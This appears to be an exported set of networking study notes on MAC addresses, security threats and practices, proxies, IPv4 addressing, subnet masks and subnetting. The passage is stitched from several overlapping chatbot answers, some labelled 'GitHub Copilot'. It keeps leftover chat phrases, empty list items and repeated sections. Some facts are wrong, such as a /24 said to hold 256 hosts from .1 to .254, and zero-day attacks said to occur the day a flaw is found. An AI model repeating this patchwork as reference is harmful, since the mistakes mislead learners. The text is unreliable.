<li>
<p><strong>Data Link Layer</strong>: MAC addresses are essential at the data link layer for framing data packets and ensuring that they are correctly transmitted over a network. Ethernet, one of the most common data link layer protocols, relies on MAC addresses to specify the source and destination of data frames.</p>
</li>
<li>
<p><strong>Not Routed</strong>: Unlike IP addresses, which are used for routing data over the internet, MAC addresses are not designed for global routing. They are limited to the local network and are not visible outside of the network segment.</p>
</li>
<li>
<p><strong>Changeability</strong>: In some cases, MAC addresses can be changed or spoofed, but it's typically a specialized operation and not a regular user-configurable setting.</p>
</li>
<li>
<p><strong>Promiscuous Mode</strong>: Network interface cards can be set to promiscuous mode, allowing them to receive and process all incoming traffic on a network segment, even if it's not addressed to their specific MAC address. This mode is often used for network analysis and monitoring.</p>
</li>
<li>
<p><strong>Layer 2 Switching</strong>: In a switched Ethernet network, MAC addresses are used by switches to determine how to forward data frames to the appropriate ports. The switch builds a MAC address table to associate MAC addresses with specific ports, enabling efficient local network communication.</p>
</li>
</ol>
<p>It's important to note that while MAC addresses are crucial for local network communication, they are not used for routing data over the broader internet. IP addresses are used for that purpose, and routers handle the translation between MAC addresses within a local network and IP addresses for global routing.</p>

<li>
<p><strong>Malware</strong>: Malicious software such as viruses, worms, trojans, ransomware, spyware, adware, and botnets.</p>
</li>
<li>
<p><strong>Phishing Attacks</strong>: This is when an attacker sends fraudulent communications that appear to come from a reputable source, usually through email. The goal is to steal sensitive data like credit card and login information or to install malware on the victim’s machine.</p>
</li>
<li>
<p><strong>Man-in-the-Middle (MitM) Attacks</strong>: In MitM attacks, the attacker secretly intercepts and possibly alters the communication between two parties who believe they are directly communicating with each other.</p>
</li>
<li>
<p><strong>Denial of Service (DoS) or Distributed Denial of Service (DDoS) Attacks</strong>: These attacks are designed to overwhelm a system’s resources, so that it cannot respond to service requests.</p>
</li>
<li>
<p><strong>SQL Injection</strong>: An attacker can use SQL injection to alter back-end SQL statements through manipulating application input.</p>
</li>
<li>
<p><strong>Zero-day Exploits</strong>: These attacks occur on the same day a weakness is discovered in software. At this point, the software’s developers have zero days to fix the vulnerability.</p>
</li>
<li>
<p><strong>DNS Tunneling</strong>: This method is used to send non-DNS traffic over DNS protocols, which can be a major threat to an organization’s network.</p>
</li>
<li>
<p><strong>Insider Threats</strong>: These threats come from individuals within the organization (employees, former employees) who have inside information about the organization's security practices, data, and computer systems.</p>
</li>
<li>
<p><strong>Advanced Persistent Threats (APTs)</strong>: These threats are prolonged, aimed attacks on specific targets with the intention to compromise their systems and gain information from them.</p>
</li>
<li>
<p><strong>Data Leakage</strong>: Unintentional data leakage can happen through various forms of unintentional actions such as system misconfigurations or careless handling of data by employees.</p>
</li>
</ol>
<p>Understanding these threats is the first step in preparing an effective defense against them. The next step is to implement security measures that will protect your network from these threats.</p>
<h2 id="network-security-measures"><a class="header" href="#network-security-measures">Network Security Measures</a></h2>
<p>Network security measures are the steps that you can take to protect your network from security threats. Here are some common network security measures:</p>
<ol>
<li>
<p><strong>Firewalls</strong>: Firewalls are used to protect networks by controlling incoming and outgoing traffic, blocking unauthorized access and threats.</p>
</li>
<li>
<p><strong>Encryption</strong>: Encryption is used to protect data by converting it into a form that cannot be read by unauthorized users.</p>
</li>
<li>
<p><strong>Intrusion Detection Systems</strong>: Intrusion detection systems are used to detect and prevent unauthorized access to a network.</p>
</li>
<li>
<p><strong>Access Control</strong>: Access control is used to restrict access to a network by only allowing authorized users to access it.</p>
</li>
</ol>
<p><strong>Network security measures are important for protecting networks from security threats. There are a number of different network security measures that can be implemented, such as firewalls, encryption, intrusion detection systems, and access control.</strong></p>
<h2 id="network-security-best-practices"><a class="header" href="#network-security-best-practices">Network Security Best Practices</a></h2>
<p>Network security best practices are a set of guidelines that can help you protect your network from unauthorized access, use, disclosure, disruption, modification, or destruction.</p>
<p>Here are some of the most important network security best practices:</p>
<ul>
<li><strong>Keep your software up to date.</strong> Software updates often include security patches that can help to protect your network from known vulnerabilities.</li>
<li><strong>Use strong passwords and enable multi-factor authentication.</strong> Strong passwords are difficult to guess and crack, and multi-factor authentication adds an extra layer of security to your accounts.</li>
<li><strong>Use a firewall and intrusion detection system (IDS).</strong> A firewall can help to block unauthorized traffic from entering your network, and an IDS can help to detect and respond to suspicious activity.</li>
<li><strong>Segment your network.</strong> Segmenting your network can help to contain a security breach if it occurs.</li>
<li><strong>Monitor your network traffic.</strong> Monitoring your network traffic can help you to identify suspicious activity and respond to threats quickly.</li>
<li><strong>Educate your employees about network security.</strong> Employees should be aware of the risks to network security and how to protect your network from attack.</li>
</ul>
<p>Here are some additional tips for improving your network security:</p>
<ul>
<li>Use a VPN when connecting to public Wi-Fi networks. VPNs encrypt your traffic, making it more difficult for attackers to intercept your data.</li>
<li>Be careful about what attachments you open and what links you click on. Phishing emails and malicious attachments are a common way for attackers to gain access to networks.</li>
<li>Back up your data regularly. In the event of a security breach, having a backup of your data can help you to recover quickly.</li>
</ul>
<p>By following these best practices, you can help to protect your network from a variety of threats.</p>
<p>In addition to the above, here are some specific network security best practices for different types of networks:</p>
<ul>
<li><strong>For enterprise networks:</strong> Use a network security information and event management (SIEM) system to collect and analyze security logs from across your network. This can help you to identify trends and patterns that may indicate a security breach.</li>
<li><strong>For small businesses:</strong> Use a managed security service provider (MSSP) to help you manage your network security. MSSPs can provide a variety of services, including monitoring your network traffic, managing your firewall, and responding to security incidents.</li>
<li><strong>For home networks:</strong> Use a home router with a built-in firewall and intrusion detection system. You should also change the default password on your router and keep the firmware up to date.</li>
</ul>
<p>By following these best practices, you can help to protect your network from a variety of threats, regardless of its size or type.</p>

</li>
<li>
<p><strong>Regular Audits</strong>: Regular network audits can help identify potential vulnerabilities and ensure compliance with any relevant regulations.</p>
</li>
</ol>
<p>Remember, network security is not a one-time task but an ongoing process. Regular monitoring and updating of your security measures is crucial to protect against evolving threats.</p>
<p>Your list of best practices for network security is comprehensive and well-rounded. Network security is indeed an ongoing process, and following these practices can help safeguard your data and network infrastructure. It's important to continually adapt to new threats and technologies. Additionally, here are a few points to expand on your best practices:</p>
<ol start="11">
<li>
<p><strong>Multi-Factor Authentication (MFA)</strong>: Implement MFA wherever possible. MFA adds an extra layer of security by requiring users to provide two or more forms of verification (e.g., password and a temporary code from a mobile app) before granting access.</p>
</li>
<li>
<p><strong>Segmentation</strong>: Divide your network into segments or VLANs (Virtual LANs) to isolate different types of traffic and devices. This limits the spread of malware or unauthorized access within your network.</p>
</li>
<li>

</li>
<li>
<p><strong>Vendor Security</strong>: Assess the security practices of vendors and third-party services you use. Ensure they meet your security standards, especially if they have access to your network or data.</p>
</li>
</ol>
<p>Remember that network security is a dynamic field, and new threats emerge regularly. Staying informed about the latest security trends and technologies is crucial to maintaining a secure network environment.</p>
<h2 id="proxy"><a class="header" href="#proxy">Proxy</a></h2>
<p>A network proxy is a server that acts as an intermediary for requests from clients seeking resources from other servers. A client connects to the proxy server, requesting some service, such as a file, connection, web page, or other resource, available from a different server and the proxy retrieves the requested resource on behalf of the client from the destination server and then returns it to the client as if it came directly from that server.</p>
<p>Network proxies are used for a variety of purposes, including:</p>
<ul>
<li><strong>Improving performance:</strong> Proxies can improve performance by caching frequently accessed resources. This can reduce the load on the destination server and improve response times for clients.</li>
<li><strong>Enhancing security:</strong> Proxies can enhance security by filtering traffic and blocking malicious websites.</li>
<li><strong>Controlling access:</strong> Proxies can control access to resources by blocking or redirecting traffic.</li>
<li><strong>Anonymizing traffic:</strong> Proxies can anonymize traffic by hiding the client's IP address from the destination server.</li>
</ul>
<p>There are two main types of network proxies:</p>
<ul>
<li><strong>Forward proxies:</strong> Forward proxies are used by clients to access resources on the internet. The client configures its web browser or other application to use the proxy server as its gateway to the internet.</li>
<li><strong>Reverse proxies:</strong> Reverse proxies are used by servers to receive requests from clients. The server configures its reverse proxy to listen on a specific port and forward requests to the appropriate server.</li>
</ul>
<p>Reverse proxies are often used to improve performance and security for web servers. They can also be used to load balance traffic across multiple servers.</p>
<p>Here are some examples of how network proxies are used:</p>
<ul>
<li>A company might use a proxy server to filter internet access for its employees. This could be used to block access to certain websites or to prevent employees from downloading pirated software.</li>
<li>A website might use a proxy server to cache frequently accessed files. This could improve performance for users by reducing the load on the web server and the amount of data that needs to be transferred.</li>
<li>A user might use a proxy server to anonymize their traffic. This could be used to protect their privacy or to access websites that are blocked in their country.</li>
</ul>
<p>Network proxies are a powerful tool that can be used to improve performance, security, and privacy.</p>
<p>GitHub Copilot: A network proxy, or simply a proxy, is a server that acts as an intermediary between a client (like your computer) and other servers from which the client requests resources. When you send a request to a website, it first goes to the proxy server, which then forwards your request to the destination server. The response from the server also goes back to the proxy server, which then forwards it to you. This process is transparent to the user.</p>
<p>There are several types of proxies, including:</p>
<ol>
<li>
<p><strong>Forward Proxy</strong>: This is the most common type of proxy. It sits between the client and the internet, forwarding requests from the client to the internet. It can be used to bypass geo-restrictions, filter content, or to provide anonymity for the user.</p>
</li>
<li>
<p><strong>Reverse Proxy</strong>: This type of proxy sits in front of web servers, forwarding client requests to the web servers. It can be used for load balancing, caching, and security purposes.</p>
</li>
<li>
<p><strong>Open Proxy</strong>: This is a type of forward proxy that can be accessed by any internet user. They are often used to anonymize web browsing and bypass content restrictions.</p>
</li>
<li>
<p><strong>Transparent Proxy</strong>: This type of proxy intercepts normal communication without requiring any special client configuration. Users are unaware of the proxy.</p>
</li>
</ol>
<p>Here's an example of how a proxy can be used:</p>
<p>Let's say you're in a country that blocks access to a certain website. You could use a forward proxy server located in a different country to access that website. When you send a request to the website, it goes to the proxy server first. The proxy server then sends the request to the website on your behalf. As far as the website is concerned, the request is coming from the proxy server, not from you. The website sends the response back to the proxy server, which then forwards it to you. This allows you to access the website even though it's blocked in your country.</p>
<p>A network proxy is an intermediate server or software application that acts as a gateway between a client (such as a computer or mobile device) and a destination server (such as a website or another network service). Proxies are widely used in computer networks for various purposes, including security, privacy, performance optimization, and content filtering. Here are some key aspects of network proxies:</p>
<ol>
<li>
<p><strong>Types of Proxies</strong>:</p>
<ul>
<li>
<p><strong>Forward Proxy</strong>: Also known as a web proxy, a forward proxy server acts on behalf of client devices to access resources on the internet. It is often used to provide anonymity, caching, content filtering, and access control. Clients configure their devices to send requests to the forward proxy, which then fetches the requested content from the destination server and returns it to the client.</p>
</li>
<li>
<p><strong>Reverse Proxy</strong>: A reverse proxy is positioned in front of web servers and acts as a gateway for client requests. It is used to distribute incoming requests among multiple backend servers, improve performance, provide security, and offer features like SSL termination and load balancing. Users connect to the reverse proxy, which then forwards requests to the appropriate backend server.</p>
</li>
<li>
<p><strong>Transparent Proxy</strong>: Transparent proxies intercept network traffic without the need for client configuration. They are often used for content filtering and monitoring in a network without the clients being aware of their presence.</p>
</li>
</ul>
</li>
<li>
<p><strong>Proxy Server Functions</strong>:</p>
<ul>
<li>
<p><strong>Caching</strong>: Proxies can store copies of web pages and resources locally. When a client requests a previously accessed resource, the proxy can serve it from its cache, reducing latency and bandwidth usage.</p>
</li>
<li>
<p><strong>Anonymity</strong>: Proxies can hide a client's IP address from the destination server, providing a level of anonymity. This can be useful for privacy or bypassing geolocation restrictions.</p>
</li>
<li>
<p><strong>Security</strong>: Proxies can inspect incoming and outgoing traffic for security threats, such as malware and malicious requests, and block or filter them.</p>
</li>
<li>
<p><strong>Content Filtering</strong>: Proxies can restrict access to specific websites or content categories, making them useful for enforcing internet usage policies in organizations.</p>
</li>
<li>
<p><strong>Load Balancing</strong>: Reverse proxies distribute client requests among multiple backend servers to improve performance and redundancy.</p>
</li>
<li>
<p><strong>SSL Termination</strong>: Reverse proxies can handle SSL/TLS encryption and decryption, reducing the processing load on backend servers.</p>
</li>
</ul>
</li>
<li>
<p><strong>Proxy Protocols</strong>:</p>
<ul>
<li>
<p><strong>HTTP Proxy</strong>: Commonly used for web traffic, an HTTP proxy operates at the application layer and is compatible with HTTP and HTTPS requests.</p>
</li>
<li>
<p><strong>SOCKS Proxy</strong>: A SOCKS proxy works at a lower network layer (transport layer) and can handle various types of traffic, including TCP and UDP. SOCKS proxies are often used for routing traffic through firewalls.</p>
</li>
</ul>
</li>
<li>
<p><strong>Risks and Considerations</strong>:</p>
<ul>
<li>
<p><strong>Privacy Concerns</strong>: While proxies can provide anonymity, the proxy operator may have access to user data. Users should choose trustworthy proxy services.</p>
</li>
<li>
<p><strong>Security</strong>: Proxies can be used for malicious purposes, such as hiding the origin of cyberattacks. Proper security measures and access controls are important.</p>
</li>
<li>
<p><strong>Performance</strong>: Proxies can introduce latency if not properly configured or overloaded. However, they can also improve performance when used for caching and load balancing.</p>
</li>
</ul>
</li>
</ol>
<p>Proxies are versatile tools with various use cases in networking, from improving performance and security to preserving anonymity and enforcing content policies. The choice of proxy type and configuration depends on the specific needs and goals of the network or individual users.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ip-addresses"><a class="header" href="#ip-addresses">IP addresses</a></h1>
<p>An IP address, which stands for Internet Protocol address, is a numerical label assigned to each device that participates in a computer network that uses the Internet Protocol for communication. IP addresses serve two primary functions: network identification and host identification. They enable devices to locate and communicate with one another on a network.</p>
<p>There are two main versions of IP addresses:</p>
<ol>
<li>IPv4 (Internet Protocol version 4): IPv4 is the older and more widely used version of IP addressing. It consists of a 32-bit address, typically expressed as four sets of decimal numbers separated by periods (e.g., 192.168.1.1). An IPv4 address is divided into a network portion and a host portion, with a subnet mask used to delineate the boundary between them.</li>
</ol>
<p>Here are a few examples of IPv4 addresses:</p>
<ul>
<li>192.168.0.1: A commonly used address in private home networks.</li>
<li>216.58.215.46: The IP address of Google's main website.</li>
<li>8.8.8.8: Google's public DNS server address.</li>
</ul>
<ol start="2">
<li>IPv6 (Internet Protocol version 6): IPv6 is the newer version of IP addressing developed to address the exhaustion of IPv4 addresses. It uses a 128-bit address format, expressed as eight groups of hexadecimal digits separated by colons (e.g., 2001:0db8:85a3:0000:0000:8a2e:0370:7334). IPv6 provides a vastly larger address space, allowing for a virtually unlimited number of unique addresses.</li>
</ol>
<p>Here are a few examples of IPv6 addresses:</p>
<ul>
<li>2001:0db8:85a3:0000:0000:8a2e:0370:7334: A generic example of an IPv6 address.</li>
<li>2001:0db8::1: The simplified form of an IPv6 address with consecutive zero blocks replaced by a double colon (::).</li>
</ul>
<p>IP addresses are used to identify and route traffic within networks and across the internet. They play a crucial role in ensuring that data reaches its intended destination, and they are fundamental to the functioning of the modern internet. Additionally, IP addresses can be either public (routable on the internet) or private (used within local networks), and they can be assigned manually or automatically using protocols like DHCP (Dynamic Host Configuration Protocol).</p>
<p>It's important to note that IP addresses are a finite and exhaustible resource in the case of IPv4, which is why IPv6 was introduced to accommodate the growing number of devices connected to the internet. IPv6 is designed to provide a virtually unlimited number of unique addresses, ensuring that the internet can continue to grow and evolve.</p>
<p>An IP address is a numerical label assigned to each device connected to a computer network that uses the Internet Protocol for communication. An IP address serves two principal functions: network interface identification and location addressing. Internet Protocol version 4 (IPv4) defines an IP address as a 32-bit number. A typical IPv4 address is expressed in dots-and-decimal notation, such as 192.168.1.1.</p>
<p>Each part of the IP address is called an octet, and each octet can range in value from 0 to 255. The first octet of an IP address is used to identify the network class, and the remaining three octets are used to identify the specific host on the network.</p>
<p>There are five classes of IPv4 addresses:</p>
<ul>
<li>Class A: Class A networks are used for large networks, such as the Internet backbone. Class A networks have IP addresses that start with a number between 0 and 127.</li>
<li>Class B: Class B networks are used for medium-sized networks, such as corporate networks. Class B networks have IP addresses that start with a number between 128 and 191.</li>
<li>Class C: Class C networks are used for small networks, such as home networks. Class C networks have IP addresses that start with a number between 192 and 223.</li>
<li>Class D: Class D networks are reserved for multicast traffic. Multicast traffic is traffic that is sent to a group of devices on the network, rather than to a single device.</li>
<li>Class E: Class E networks are reserved for experimental use.</li>
</ul>
<p>Here are some examples of IP addresses:</p>
<ul>
<li>Class A: 10.0.0.1</li>
<li>Class B: 172.16.0.1</li>
<li>Class C: 192.168.1.1</li>
<li>Class D: 224.0.0.1</li>
<li>Class E: 240.0.0.1</li>
</ul>
<p>IPv6 is the latest version of the Internet Protocol, and it uses 128-bit addresses. IPv6 addresses are expressed in hexadecimal notation, and they look like this:</p>
<pre><code>2001:0db8:85a3:0000:0000:8a2e:0370:7334
</code></pre>
<p>IPv6 addresses are much larger than IPv4 addresses, which allows for a much larger number of addresses to be used. This is important because the number of devices connected to the Internet is growing rapidly.</p>
<p>IP addresses are essential for networking, and they are used in a variety of ways. By understanding how IP addresses work, you can better understand how networks work and how to troubleshoot network problems.</p>
<p>GitHub Copilot: An IP (Internet Protocol) address is a unique identifier for a device on a network. It's used to locate and identify the device among billions of devices connected to the Internet. There are two versions of IP addresses in use: IPv4 and IPv6.</p>
<ol>
<li>
<p><strong>IPv4</strong>: This is the fourth version of the Internet Protocol. It uses 32-bit addresses, which limits the address space to approximately 4.3 billion addresses. IPv4 addresses are typically represented in dot-decimal notation, with four numbers separated by periods, each ranging from 0 to 255. For example, <code>192.168.1.1</code>.</p>
</li>
<li>
<p><strong>IPv6</strong>: This is the most recent version of the Internet Protocol. It was developed to deal with the long-anticipated problem of IPv4 address exhaustion. IPv6 uses 128-bit addresses, allowing for a significantly larger number of addresses. IPv6 addresses are represented as eight groups of four hexadecimal digits, each group representing 16 bits. The groups are separated by colons. For example, <code>2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>.</p>
</li>
</ol>
<p>Here are some special types of IP addresses:</p>
<ul>
<li>
<p><strong>Private IP addresses</strong>: These are used for local area networks (LANs) and are not routable on the internet. Examples include <code>192.168.0.1</code> in IPv4 and <code>fd00::1</code> in IPv6.</p>
</li>
<li>
<p><strong>Public IP addresses</strong>: These are used on the internet and can be accessed over the internet. Your internet service provider (ISP) assigns a public IP address to your router.</p>
</li>
<li>
<p><strong>Loopback IP address</strong>: This is used for testing network software. The address <code>127.0.0.1</code> is reserved for loopback in IPv4, and <code>::1</code> is reserved for loopback in IPv6. These addresses refer back to the device itself.</p>
</li>
<li>
<p><strong>Broadcast IP address</strong>: This is used to send data to all devices on a network. The address <code>255.255.255.255</code> is reserved for broadcast in IPv4. IPv6 does not use broadcast addressing.</p>
</li>
</ul>
<p>Understanding IP addressing is fundamental to managing and troubleshooting network activities.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ipv4"><a class="header" href="#ipv4">IPv4</a></h1>
<p>GitHub Copilot: IPv4, or Internet Protocol version 4, is the fourth version of the Internet Protocol (IP). It is one of the core protocols of standards-based internetworking methods on the Internet and was the first version deployed for production in ARPANET in 1983. It still routes most Internet traffic today, despite the ongoing deployment of a successor protocol, IPv6.</p>
<p>IPv4 uses 32-bit addresses which limits the address space to 4294967296 (2^32) possible unique addresses. However, many are reserved for special purposes such as private networks (~18 million addresses) or multicast addresses (~270 million addresses). This reduces the number of addresses that can be allocated as public Internet addresses.</p>
<p>IPv4 addresses are typically represented in dot-decimal notation, with four numbers separated by periods, each ranging from 0 to 255, for example, <code>192.168.0.1</code>.</p>
<p>Here are some special types of IPv4 addresses:</p>
<ol>
<li>
<p><strong>Private Addresses</strong>: These are reserved for private networks and are not routable on the public Internet. Examples include <code>192.168.0.1</code>, <code>10.0.0.1</code>, <code>172.16.0.1</code>.</p>
</li>
<li>
<p><strong>Loopback Address</strong>: The address <code>127.0.0.1</code> is reserved for loopback. This means that it is used by the host computer to send a message back to itself for testing network software.</p>
</li>
<li>
<p><strong>Broadcast Address</strong>: This is an address that allows information to be sent to all machines on a given subnet rather than a specific machine. The broadcast address of any IP address can be obtained by taking the bit complement of the subnet mask, and then performing a bitwise OR operation with the IP address itself. For example, for the IP address <code>192.168.0.1</code> with a subnet mask of <code>255.255.255.0</code>, the broadcast address would be <code>192.168.0.255</code>.</p>
</li>
<li>
<p><strong>Multicast Addresses</strong>: These are used to send a single packet to a group of hosts. IPv4 multicast addresses are defined by the leading address bits of <code>1110</code>, originating from the classful network design of the early Internet when this group of addresses was designated as Class D. The CIDR notation for this group is <code>224.0.0.0/4</code>. The group includes the addresses from <code>224.0.0.0</code> to <code>239.255.255.255</code>.</p>
</li>
</ol>
<p>Understanding IPv4 addressing is fundamental to managing and troubleshooting network activities.</p>
<p>IPv4 (Internet Protocol version 4) is the fourth revision of the Internet Protocol and one of the most widely used addressing schemes for the Internet. It uses a 32-bit address format, typically expressed as four sets of decimal numbers separated by periods (e.g., 192.168.1.1). Each set of numbers, known as an octet, can have a value between 0 and 255. Here are some examples of IPv4 addresses:</p>
<ol>
<li>
<p><strong>192.168.0.1</strong>: This is a commonly used private IP address, often assigned to a router or a local device in a home or small business network. It's part of the reserved private IP address range.</p>
</li>
<li>
<p><strong>10.0.0.1</strong>: Another private IP address, often used as the default gateway for many home and business networks. It falls within the private IP address space.</p>
</li>
<li>
<p><strong>172.16.0.1</strong>: This is also a private IP address, often used in larger networks. It's within the private IP address range reserved for internal use.</p>

<p><strong>203.0.113.12</strong>: An example of a public IPv4 address. This address could be assigned to a web server or any device accessible from the internet. Public IP addresses are unique and routable on the global internet.</p>
</li>
<li>
<p><strong>8.8.8.8</strong>: This is one of Google's public DNS server IP addresses. It's used for translating domain names into IP addresses, helping resolve internet domain names to their corresponding IP addresses.</p>
</li>
<li>
<p><strong>216.58.215.46</strong>: This IP address corresponds to Google's main website. When you type &quot;www.google.com&quot; into your web browser, it's resolved to this IP address, allowing your browser to connect to Google's servers.</p>
</li>
<li>
<p><strong>198.51.100.1</strong>: An example of an address reserved for documentation and examples. It's part of the &quot;Test-Net&quot; range designated in RFC 5737.</p>
</li>
<li>
<p><strong>127.0.0.1</strong>: This is the loopback address, often referred to as &quot;localhost.&quot; It's used to establish network connections with the local host (the device itself). If you ping 127.0.0.1, you're essentially testing your own network stack.</p>
</li>
<li>
<p><strong>169.254.0.1</strong>: This is an Automatic Private IP Address (APIPA). It's assigned to a device when it can't obtain an IP address from a DHCP server. It's typically used for self-assigned IP addresses in local networks.</p>
</li>
<li>
<p><strong>0.0.0.0</strong>: This is a special IP address used to represent the default route (gateway) or an invalid/uninitialized address in some contexts. It's not typically assigned to devices.</p>
</li>
</ol>
<p>These examples illustrate the diversity of IPv4 addresses, which are used for various purposes, from private network addressing to public internet-facing services. IPv4, while still widely used, has limitations due to address exhaustion, leading to the development and adoption of IPv6, which provides a much larger address space.</p>
<p>IPv4 (Internet Protocol version 4) is the fourth version of the Internet Protocol (IP). It is the most widely used version of IP today, and it is used to address and route devices on the Internet.</p>
<p>IPv4 addresses are 32-bit numbers that are typically represented in dotted quad format. The dotted quad format consists of four octets, which are 8-bit numbers. The octets are separated by periods.</p>
<p>Here are some examples of IPv4 addresses:</p>
<ul>
<li>192.168.1.1</li>
<li>10.0.0.1</li>
<li>172.16.0.1</li>
<li>8.8.8.8 (Google Public DNS)</li>
<li>1.1.1.1 (Cloudflare DNS)</li>
</ul>
<p>IPv4 addresses are divided into different classes, depending on the first octet of the address. The classes are as follows:</p>
<ul>
<li>Class A: 0.0.0.0 - 127.255.255.255</li>
<li>Class B: 128.0.0.0 - 191.255.255.255</li>
<li>Class C: 192.0.0.0 - 223.255.255.255</li>
</ul>
<p>Class A addresses are typically used for large networks, such as the backbone of the Internet. Class B addresses are typically used for medium-sized networks, such as corporate networks. Class C addresses are typically used for small networks, such as home networks.</p>
<p>IPv4 addresses are also divided into different subnets. Subnetting allows you to divide a large network into smaller networks. Subnets are created by using a subnet mask. The subnet mask is a 32-bit number that tells the router which bits of the IP address are used for the network prefix and which bits are used for the host address.</p>
<p>Here is an example of subnetting:</p>
<pre><code>Network address: 192.168.1.0
Subnet mask: 255.255.255.0
Subnet: 192.168.1.0/24
</code></pre>
<p>This subnet contains 256 host addresses, from 192.168.1.1 to 192.168.1.254.</p>
<p>IPv4 is a complex topic, but this is a brief overview of the basics. I hope this is helpful!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subnet-mask"><a class="header" href="#subnet-mask">Subnet mask</a></h1>
<p>GitHub Copilot: A subnet mask is a 32-bit number used to divide an IP address into two parts: one part identifies the host (computer or other device), and the other part identifies the network to which it belongs. </p>
<p>To visualize this, an IP address is written in binary form and the subnet mask is applied to it using a bitwise AND operation. The result gives the network address, and the remainder represents the host within that network.</p>
<p>Subnet masks are often seen in dot-decimal notation like an IP address. For example, a very common subnet mask in its binary representation, <code>11111111.11111111.11111111.00000000</code>, is equivalent to <code>255.255.255.0</code> in dot-decimal notation.</p>
<p>The use of subnet masks can create multiple logical networks within a single Class A, B, or C network. This is often used to increase performance, or provide a means of security, as it can limit the impact of a broadcast storm or limit the spread of information for security purposes.</p>
<p>Sure. A subnet mask is a 32-bit number that is used to divide an IP address into two parts: the network address and the host address. The network address is the part of the IP address that identifies the network to which the device is connected. The host address is the part of the IP address that identifies the specific device on the network.</p>
<p>Subnet masks are used to improve network performance and security. By dividing a network into smaller subnetworks, broadcast traffic is reduced and network security is improved.</p>
<p>Here is an example of how a subnet mask is used:</p>
<pre><code>IP address: 192.168.1.100
Subnet mask: 255.255.255.128
</code></pre>
<p>The network address for this IP address is 192.168.1.0 and the host address is 100. This means that all devices with an IP address between 192.168.1.0 and 192.168.1.127 are on the same subnet.</p>
<p>Subnet masks are an important part of networking, and they are used in a variety of ways. By understanding how subnet masks work, you can better understand how networks work and how to troubleshoot network problems.</p>
<p>Here are some tips for using subnet masks:</p>
<ul>
<li>Use a subnet calculator to determine the correct subnet mask for your network.</li>
<li>Configure all devices on the same subnet to use the same subnet mask.</li>
<li>Use subnet masks to isolate different departments or networks from each other.</li>
<li>Use subnet masks to reduce broadcast traffic.</li>
</ul>
<p>I hope this helps!</p>
<p>Certainly! Here are a few examples of subnet masks along with descriptions of their use and characteristics:</p>
<ol>
<li>
<p>Subnet Mask: 255.255.255.0 (or /24 in CIDR notation)
Description: This subnet mask divides an IPv4 address into a network portion (the first 24 bits) and a host portion (the remaining 8 bits). It's commonly used in small to medium-sized local area networks (LANs) where each subnet can accommodate up to 254 hosts. The first three octets (24 bits) represent the network, and the last octet (8 bits) is used for host addressing.</p>
</li>
<li>
<p>Subnet Mask: 255.255.0.0 (or /16 in CIDR notation)
Description: This subnet mask allocates the first 16 bits of an IPv4 address to the network and the remaining 16 bits for host addressing. It's often used in larger organizations and campus networks where each subnet can support up to 65,534 hosts. This provides more room for hosts but results in fewer available subnets compared to a /24 mask.</p>
</li>
<li>
<p>Subnet Mask: 255.255.255.192 (or /26 in CIDR notation)
Description: This subnet mask divides an IPv4 address into a network portion of 26 bits and a host portion of 6 bits. It is useful in scenarios where you need smaller subnets with limited hosts. In this case, each subnet can support up to 62 hosts. This can be practical for point-to-point connections or small, segmented subnetworks.</p>
</li>
<li>
<p>Subnet Mask: 255.255.255.248 (or /29 in CIDR notation)
Description: A /29 subnet mask allocates 29 bits to the network portion and 3 bits for host addressing. This results in very small subnets, each supporting up to 6 hosts. Such small subnets are typically used for special purposes, such as router point-to-point links.</p>
</li>
<li>
<p>Subnet Mask: 255.0.0.0 (or /8 in CIDR notation)
Description: A /8 subnet mask designates the first 8 bits of an IPv4 address for the network and the remaining 24 bits for hosts. This is a classful network mask and was part of the older classful IP addressing scheme. It can create very large networks with up to 16.7 million host addresses, which is typically used by major Internet Service Providers (ISPs).</p>
</li>
<li>
<p>Subnet Mask: 0.0.0.0 (or /0 in CIDR notation)
Description: A /0 subnet mask, also known as a default route, essentially means that no bits are reserved for network identification. It is used in special situations to indicate that a destination IP address should be routed using the default route, allowing for global routing and internet connectivity.</p>
</li>
</ol>
<p>Subnet masks are essential for determining the network and host portions of an IP address and for controlling the size and organization of subnetworks within a larger IP network. The choice of a subnet mask depends on the specific requirements and the number of hosts and subnets you need in your network design.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="subnetting"><a class="header" href="#subnetting">Subnetting</a></h1>
<p>Network subnetting is the process of dividing a single network into smaller subnetworks. This is done by borrowing bits from the host portion of the IP address and using them to create a subnet mask. The subnet mask is then used to determine which IP addresses belong to the same subnet.</p>
<p>Subnetting is useful for a number of reasons, including:</p>
<ul>
<li><strong>Improved network performance:</strong> Subnetting can improve network performance by reducing the amount of broadcast traffic on the network. Broadcast traffic is traffic that is sent to all devices on the network. When a network is subnetted, broadcast traffic is only sent to the devices on the same subnet. This reduces the amount of traffic that each device has to process, which can improve network performance.</li>
<li><strong>Increased security:</strong> Subnetting can increase network security by isolating different subnets from each other. This makes it more difficult for attackers to gain access to all of the devices on the network.</li>
<li><strong>More efficient use of IP addresses:</strong> Subnetting allows you to more efficiently use IP addresses. This is because you can subdivide a single network into smaller subnetworks, each with its own IP address range. This allows you to assign IP addresses to devices on a subnet-by-subnet basis, rather than having to assign them to all of the devices on the network at once.</li>
</ul>
<p>To subnet a network, you need to know the following:</p>
<ul>
<li>The network address: The network address is the IP address of the network itself.</li>
<li>The subnet mask: The subnet mask is used to determine which IP addresses belong to the same subnet.</li>
<li>The number of subnets: This is the number of subnetworks that you want to divide the network into.</li>
</ul>
<p>Once you have this information, you can use the following steps to subnet the network:</p>
<ol>
<li>Determine the subnet mask. This can be done using a subnet calculator.</li>
<li>Divide the network address into subnets. This can be done by using the subnet mask to determine which bits of the IP address are used for the subnet and which bits are used for the host.</li>
<li>Assign IP addresses to each subnet. This can be done by using the subnet mask to determine which IP addresses are valid for each subnet.</li>
</ol>
<p>Here is an example of how to subnet a network:</p>
<pre><code>Network address: 192.168.1.0
Subnet mask: 255.255.255.128
Number of subnets: 2

Subnet 1: 192.168.1.0/25
Subnet 2: 192.168.1.128/25
</code></pre>
<p>Once the network has been subnetted, you can configure your devices to use the appropriate subnet mask and IP address. You can also configure routers to route traffic between the different subnets.</p>
<p>Subnetting is a complex topic, but it is an essential skill for any network administrator. By understanding subnetting, you can improve network performance, security, and efficiency.</p>
